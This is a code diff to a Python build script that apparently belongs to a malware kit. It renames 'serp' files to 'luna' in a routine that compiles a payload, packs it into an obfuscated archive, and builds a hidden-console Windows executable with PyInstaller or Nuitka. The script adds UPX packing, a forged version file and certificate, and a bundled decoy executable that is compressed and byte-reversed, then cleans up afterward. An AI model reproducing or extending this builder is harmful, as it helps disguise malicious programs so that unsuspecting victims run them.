@@ -13,7 +13,6 @@ import shutil
 import string
 import subprocess
 import sys
-import this
 import threading
 import time
 import winreg
@@ -690,7 +689,7 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
             self.MakeVersionFileAndCert()
             
             compiledFile = "./luna-o.pyc"
-            zipFile = "serp.aes"
+            zipFile = "luna.aes"
             py_compile.compile(f"./{filename}.py", compiledFile)
             os.remove(f"./{filename}.py")
             with zipfile.ZipFile(zipFile, "w") as f:
@@ -727,7 +726,7 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
                     "--onefile", "--clean", "--noconsole",
                     "--upx-dir=./tools", "--distpath=./",
                     "--version-file", "./version.txt",
-                    "--add-data", "serp.aes;.", "--name", f'{filename}.exe',
+                    "--add-data", "luna.aes;.", "--name", f'{filename}.exe',
                     "--icon", exeicon, "./loader-o.py"
                 ]
             
@@ -735,9 +734,9 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
                     command.insert(-1, "--hidden-import")
                     command.insert(-1, module)
                     
-                if os.path.isfile("bound.serp"):
+                if os.path.isfile("bound.luna"):
                     command.insert(-1, "--add-data")
-                    command.insert(-1, "bound.serp;.")     
+                    command.insert(-1, "bound.luna;.")     
 
                 subprocess.run(command)
                 
@@ -756,7 +755,7 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
                     command = [
                         sys.executable, "-m", "nuitka",
                         "--onefile", "--standalone", "--remove-output",
-                        "--prefer-source-code", "--include-data-file=serp.aes=.",
+                        "--prefer-source-code", "--include-data-file=luna.aes=.",
                         "--show-progress", "--assume-yes-for-downloads",
                         "--windows-disable-console",
                         f"./{orig_filename}.py"
@@ -772,8 +771,8 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
                         for option, value in nuitka_options.items():
                             command.insert(-1, f"{option}={value}")
                             
-                        if os.path.isfile("bound.serp"):
-                            command.insert(-1, f"--include-data-file=bound.serp=.")
+                        if os.path.isfile("bound.luna"):
+                            command.insert(-1, "--include-data-file=bound.luna=.")
                             
                         if exeicon != "NONE":
                             command.insert(-1, f"--windows-icon-from-ico={exeicon}")
@@ -800,7 +799,7 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
 
     def cleanup_files(self, filename):
         cleans_dir = {'./__pycache__', './build'}
-        cleans_file = {f'./{filename}.spec', f'./{filename}.exe.spec', "./tools/upx.exe", "bound.serp", "serp.aes", "loader-o.py", "loader-o.spec"}
+        cleans_file = {f'./{filename}.spec', f'./{filename}.exe.spec', "./tools/upx.exe", "bound.luna", "luna.aes", "loader-o.py", "loader-o.spec"}
 
         for clean in cleans_dir:
             try:
@@ -973,7 +972,7 @@ class %s:
     
         for path in paths:
             if os.path.isdir(path):
-                exeFiles += [os.path.join(path, x) for x in os.listdir(path) if (x.endswith(".exe") and not x in exeFiles)]
+                exeFiles += [os.path.join(path, x) for x in os.listdir(path) if (x.endswith(".exe") and x not in exeFiles)]
     
         if exeFiles:
             while(retries < 5):
@@ -1002,11 +1001,11 @@ class %s:
                 
             encrypted = zlib.compress(content)[::-1]
             
-            with open("bound.serp", "wb") as f:
+            with open("bound.luna", "wb") as f:
                 f.write(encrypted)
                 
-        elif os.path.isfile("bound.serp"):
-            os.remove("bound.serp")
+        elif os.path.isfile("bound.luna"):
+            os.remove("bound.luna")
             
     def ExtractNuitkaOptions(self, origFilenameOnly: bool=False):
         with open('version.txt', 'r', encoding='utf-8') as file:
